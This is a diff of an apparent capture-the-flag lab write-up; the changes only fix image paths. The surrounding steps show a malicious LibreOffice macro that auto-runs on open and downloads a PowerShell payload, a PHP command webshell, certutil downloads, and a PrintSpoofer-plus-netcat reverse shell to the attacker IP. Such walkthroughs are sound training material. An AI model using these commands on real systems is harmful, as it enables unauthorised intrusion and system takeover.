@@ -77,78 +77,78 @@ Enumerated top 200 UDP ports:
 
 #### - Navigated to "http://192.168.122.169" and found the following webpage:
 
-![](Pasted%20image%2020230407224047.png)
+![](Images/Pasted%20image%2020230407224047.png)
 
 #### - Found the following where we can upload our "resume":
 
-![](Pasted%20image%2020230407224227.png)
+![](Images/Pasted%20image%2020230407224227.png)
 
 #### - Tried to upload a random file and received the following:
 
-![](Pasted%20image%2020230407224319.png)
+![](Images/Pasted%20image%2020230407224319.png)
 
 #### - Googled ".odt file" and found the following page showing .odt files are typically created by OpenOffice and LibreOffice Writer programs:
 
-![](Pasted%20image%2020230407224402.png)
+![](Images/Pasted%20image%2020230407224402.png)
 
-![](Pasted%20image%2020230407224442.png)
+![](Images/Pasted%20image%2020230407224442.png)
 
 #### - I then downloaded LibreOffice on my kali machine by typing "sudo apt-get install -y libreoffice-writer"
 
 #### - Started LibreOffice and clicked "Writer Document":
 
-![](Pasted%20image%2020230407224535.png)
+![](Images/Pasted%20image%2020230407224535.png)
 
 #### - Clicked Tools > Macros > Organize Macros > Basic:
 
-![](Pasted%20image%2020230407224628.png)
+![](Images/Pasted%20image%2020230407224628.png)
 
 #### - Clicked "Untitled 1" > "New" and named the file Offsec1 and clicked "OK":
 
-![](Pasted%20image%2020230407224715.png)
+![](Images/Pasted%20image%2020230407224715.png)
 
 #### - Typed Tab > Shell ("cmd /c powershell iwr [Kali IP]") between "Sub Main" and "End Sub" (which will perform an HTTP request to our IP). If we are hosting on port 80 and port is open the command should execute:
 
-![](Pasted%20image%2020230407225512.png)
+![](Images/Pasted%20image%2020230407225512.png)
 
 #### - Clicked File > Save 
 
-![](Pasted%20image%2020230407230026.png)
+![](Images/Pasted%20image%2020230407230026.png)
 
 #### - Named the file "Offesec1" and clicked Save:
 
-![](Pasted%20image%2020230407230118.png)
+![](Images/Pasted%20image%2020230407230118.png)
 
 #### - Closed out of the Offsec.odt document
 
 #### - I then attached the macro/script to an event by clicking Tools > customize and in the "Events" tab > Open Document > Macro > double cick Offesec1.odt > double click Standard > click Offsec1 > click Main > click OK:
 
-![](Pasted%20image%2020230407230317.png)
+![](Images/Pasted%20image%2020230407230317.png)
 
-![](Pasted%20image%2020230407230358.png)
+![](Images/Pasted%20image%2020230407230358.png)
 
-![](Pasted%20image%2020230407230439.png)
+![](Images/Pasted%20image%2020230407230439.png)
 
 #### - Now the Event "Open Document" is assigned an action:
 
-![](Pasted%20image%2020230407230524.png)
+![](Images/Pasted%20image%2020230407230524.png)
 
 #### - Clicked "File" then "Save"
 
 
 #### - Typed "updog -p 80" (in the same directory where the newly created Offsec1.odt file is located in) on my kali machine to host the .odt file:
 
-![](Pasted%20image%2020230407230715.png)
+![](Images/Pasted%20image%2020230407230715.png)
 
 #### - Navigated back to the webpage and clicked "browse" and chose my newly created ".odt" file and clicked upload and received the following page showing the file was accepted:
 
-![](Pasted%20image%2020230407230828.png)
+![](Images/Pasted%20image%2020230407230828.png)
 
-![](Pasted%20image%2020230407230856.png)
+![](Images/Pasted%20image%2020230407230856.png)
 
 #### - Looking back on our kali machine hosting the .odt file we received code 200 and confirm we have execution on the target machine in the event someone opens the document we just uploaded to the target site
 
-![](Pasted%20image%2020230407230954.png)
+![](Images/Pasted%20image%2020230407230954.png)
 
 ---
 
@@ -163,7 +163,7 @@ Shell("cmd /c powershell iwr http://192.168.45.5:80/offsec.ps1 -o C:/Windows/Tas
 
 Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
-![](Pasted%20image%2020230407231101.png)
+![](Images/Pasted%20image%2020230407231101.png)
 
 #### - Clicked File then save
 
@@ -173,7 +173,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Copied contents in between the quotation marks in the PowerShell #3 tab for Windows payload and pasted it into the offsec.ps1 file
 
-![](Pasted%20image%2020230407231301.png)
+![](Images/Pasted%20image%2020230407231301.png)
 
 #### - Typed chmod 775 offsec.ps1 to make it executable
 
@@ -181,7 +181,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Re-uploaded the offsec1.odt file and receive a windows reverse shell
 
-![](Pasted%20image%2020230407231504.png)
+![](Images/Pasted%20image%2020230407231504.png)
 
 # Lateral Movement to user
 ## Local Enumeration
@@ -198,7 +198,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Attempted to write to the directory to confirm write permissions and found we did have write permissions:
 
-![](Pasted%20image%2020230407231750.png)
+![](Images/Pasted%20image%2020230407231750.png)
 
 #### - Googled "php one liner command shell"
 
@@ -210,7 +210,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Navigated to http://192.168.98.169/cmd.php?cmd=whoami in firefox and found we have command execution as apache
 
-![](Pasted%20image%2020230407231839.png)
+![](Images/Pasted%20image%2020230407231839.png)
 
 ## Lateral Movement vector
 # PHP Webshell
@@ -219,7 +219,7 @@ Shell("cmd /c powershell -c C:/Windows/Tasks/offsec.ps1")
 
 #### - Created a powershell reverse shell named reverse.ps1:
 
-![](Pasted%20image%2020230407231917.png)
+![](Images/Pasted%20image%2020230407231917.png)
 
 #### - Started an http server in the directory with the reverse.ps1 to host the file
 
@@ -231,7 +231,7 @@ http://192.168.98.169/cmd.php?cmd=certutil.exe%20-urlcache%20-split%20-f%20http:
 
 http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.ps1
 
-![](Pasted%20image%2020230407232026.png)
+![](Images/Pasted%20image%2020230407232026.png)
 ---
 
 # Privilege Escalation
@@ -239,18 +239,19 @@ http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.p
 
 #### - Typed whoami /all and found the apache user has SeImpersonatePrivilege enabled
 
-![](Pasted%20image%2020230407232107.png)
+![](Images/Pasted%20image%2020230407232107.png)
 
 #### - Typed systeminfo to see the box is running Windows Server 2019 Standard on OS Version 10.0.17763 and x64 based PC
 
-![](Pasted%20image%2020230407232156.png)
+![](Images/Pasted%20image%2020230407232156.png)
 
+![](Images/Pasted%20image%2020230407232222.png)
 
 #### - Googled "Windows Server 2019 Standard SeImpersonate privilege escalation" and found the following webpage to utilize PrintSpoofer64.exe to escalate privileges:
 
-![](Images/Pasted%20image%2020230407210309.png)
+![](Images/Pasted%20image%2020230407232311.png)
 
-![](Images/Pasted%20image%2020230407210430.png)
+![](Images/Pasted%20image%2020230407232337.png)
 
 
 ## Privilege Escalation vector
@@ -262,7 +263,7 @@ http://192.168.98.169/cmd.php?cmd=cmd /c powershell -c C:/xampp/htdocs/reverse.p
 
 certutil.exe -urlcache -split -f http://192.168.49.98:81/PrintSpoofer64.exe PrintSpoofer64.exe
 
-![](Images/Pasted%20image%2020230407204907.png)
+![](Images/Pasted%20image%2020230407232418.png)
 
 #### - Downloaded nc64.exe from kali machine to target machine as well
 
@@ -270,6 +271,6 @@ certutil.exe -urlcache -split -f http://192.168.49.98:81/PrintSpoofer64.exe Prin
 
 ./PrintSpoofer64.exe -c "nc64.exe 192.168.49.98 1337 -e cmd"
 
-![](Images/Pasted%20image%2020230407212025.png)
+![](Images/Pasted%20image%2020230407232506.png)
 
-![](Images/Pasted%20image%2020230407212132.png)
+![](Images/Pasted%20image%2020230407232534.png)
